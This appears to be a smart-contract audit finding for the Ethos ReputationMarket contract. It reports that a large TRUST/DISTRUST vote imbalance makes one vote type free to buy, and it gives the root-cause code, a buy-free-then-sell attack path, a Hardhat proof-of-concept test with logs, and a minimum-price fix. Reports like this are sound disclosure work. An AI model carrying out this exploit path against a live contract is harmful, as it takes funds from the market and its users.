# ReputationMarket.sol :: buyVotes() If the difference between the votes is too large, the votes can be acquired for free.

### Summary

 `buyVotes()` allows purchasing votes for a specific `profileId`. However, there is an issue: when there is a significant disparity between the current TRUST and DISTRUST votes, the vote type with the smaller quantity can be acquired for free, as its price is calculated as zero.

### Root Cause

[buyVotes()](https://github.com/sherlock-audit/2024-12-ethos-update/blob/main/ethos/packages/contracts/contracts/ReputationMarket.sol#L448) relies on the `_calcCost()` method to determine the price of votes based on both the current votes and the new votes being added.
```solidity
function _calcCost(
    Market memory market,
    bool isPositive,
    bool isBuy,
    uint256 amount
  ) private pure returns (uint256 cost) {
    // cost ratio is a unitless ratio of N / 1e18
    uint256[] memory voteDelta = new uint256[](2);
    // convert boolean input into market state change
    if (isBuy) {
      if (isPositive) {
        voteDelta[0] = market.votes[TRUST] + amount;
        voteDelta[1] = market.votes[DISTRUST];
      } else {
        voteDelta[0] = market.votes[TRUST];
        voteDelta[1] = market.votes[DISTRUST] + amount;
      }
    } else {
      if (isPositive) {
        voteDelta[0] = market.votes[TRUST] - amount;
        voteDelta[1] = market.votes[DISTRUST];
      } else {
        voteDelta[0] = market.votes[TRUST];
        voteDelta[1] = market.votes[DISTRUST] - amount;
      }
    }

@>  int256 costRatio = LMSR.getCost(
      market.votes[TRUST],
      market.votes[DISTRUST],
      voteDelta[0],
      voteDelta[1],
      market.liquidityParameter
    );

    uint256 positiveCostRatio = costRatio > 0 ? uint256(costRatio) : uint256(costRatio * -1);
    // multiply cost ratio by base price to get cost; divide by 1e18 to apply ratio
    cost = positiveCostRatio.mulDiv(
      market.basePrice,
      1e18,
      isPositive ? Math.Rounding.Floor : Math.Rounding.Ceil 
    );
  }
```
The LMSR library is used to calculate the price of votes in this implementation. However, an issue arises when there is a significant imbalance between the TRUST and DISTRUST vote counts. Specifically, when the difference between `market.votes` (current votes) and `voteDelta` (new votes) is large, the calculated price for one of the vote types becomes zero. This occurs because all the cost is concentrated on the vote type with the higher count, leaving the other type essentially free. This behavior is demonstrated more clearly in the POC.

For instance, if TRUST votes equal 50,000 and DISTRUST votes are only 8,000 (a difference of approximately 6x), the price for DISTRUST votes becomes zero. This allows users to purchase DISTRUST votes at no cost. However, once a user acquires enough DISTRUST votes to reduce the gap between TRUST and DISTRUST votes to below 6x, subsequent DISTRUST votes will no longer be free as the price recalculates to a non-zero value. 

This is a plausible scenario, for example, if a user is highly trusted and everyone votes for TRUST.

The issue arises because the new votes added are not enough to impact the `newCost`, causing it to remain equal to the `oldCost` and resulting in a value of 0 (`newCost - oldCost`). You can observe this behavior by adding the following `console.log` in the `getCost()` of the `LSMR.sol` contract when running the POC.
```solidity
function getCost(
    uint256 currentYesVotes,
    uint256 currentNoVotes,
    uint256 outcomeYesVotes,
    uint256 outcomeNoVotes,
    uint256 liquidityParameter
  ) public pure returns (int256 costDiff) {
    uint256 oldCost = _cost(currentYesVotes, currentNoVotes, liquidityParameter);
    uint256 newCost = _cost(outcomeYesVotes, outcomeNoVotes, liquidityParameter);

    console.log("oldCost:", oldCost);
    console.log("newCost:", newCost);

    costDiff = int256(newCost) - int256(oldCost);
  }
```
This creates an exploit where a user can obtain votes at no cost. Additionally, the fees will be 0 because the price of the votes is 0.

### Internal Pre-conditions

The number of TRUST votes is roughly 6 times greater than the number of DISTRUST votes or vice versa.

### External Pre-conditions

None.

### Attack Path

A malicious user can exploit the system to generate free money using the following steps:

1. The gap between TRUST and DISTRUST votes is sufficiently large, causing the price of DISTRUST votes to drop to zero.  
2. The attacker takes advantage of this by purchasing DISTRUST votes at no cost using `buyVotes()`. 
3. The attacker waits until someone purchases a few DISTRUST votes, causing their price to become non-zero, and then sells them using `sellVotes()`, pocketing the profit. 
(Alternatively, the same attacker could buy a small amount to reset the price of DISTRUST votes to a non-zero value, positioning themselves to make a significant profit by selling the previously acquired votes.)

### Impact

Users are able to acquire votes without cost.

### PoC

To better understand the issue, copy the following proof of concept into `rep.price.test.ts` inside `describe('Very high price limits)`.
```js
it('votes can be obtained for free.', async () => {
      const billionEth = ethers.parseEther('1000000000');
      const maxVotes = 50000n;
      // buy many votes to increase the differnce between votes
      await userA.buyVotes({ votesToBuy: maxVotes, buyAmount: billionEth });

      const currentPricePositive = await reputationMarket.getVotePrice(DEFAULT.profileId, true);
      const currentPriceNegative = await reputationMarket.getVotePrice(DEFAULT.profileId, false);
    
      console.log("currentPricePositive:", currentPricePositive);
      console.log("currentPriceNegative:", currentPriceNegative);
      console.log("Result:", currentPricePositive + currentPriceNegative);

      //price for DISTRUST is 0
      expect(currentPriceNegative).to.equal(0);

      //user hasn't DISTRUST votes
      const { distrustVotes: beforeDistrustVotes } = await userA.getVotes();
      expect(beforeDistrustVotes).to.equal(0);

      //user buy 8000 DISTRUST votes for 0 eth (buyAmount is msg.value)
      await userA.buyVotes({ votesToBuy: 8000n, buyAmount: 0n, isPositive: false });

      //user obtains 8000 DISTRUST votes for free
      const { distrustVotes: afterDistrustVotes } = await userA.getVotes();
      expect(afterDistrustVotes).to.equal(8000);    
    });
```
```js
----------LOGS----------
currentPricePositive: 999999999999999999n
currentPriceNegative: 0n
Result: 999999999999999999n
```
As you can see, the entire price is allocated to the TRUST votes, leaving the price for DISTRUST votes at zero. This allows votes to be purchased for free, as long as the ratio between TRUST and DISTRUST votes is approximately 6:1. However, if a user attempts to buy 10,000 DISTRUST votes, the price will no longer be zero, since the ratio between the votes will be reduced to 5:1 (50,000 TRUST votes / 10,000 DISTRUST votes).

### Mitigation

To resolve the issue, one solution could be to set a minimum price for the votes. If the calculated price is zero, the minimum price should be applied when purchasing the votes.
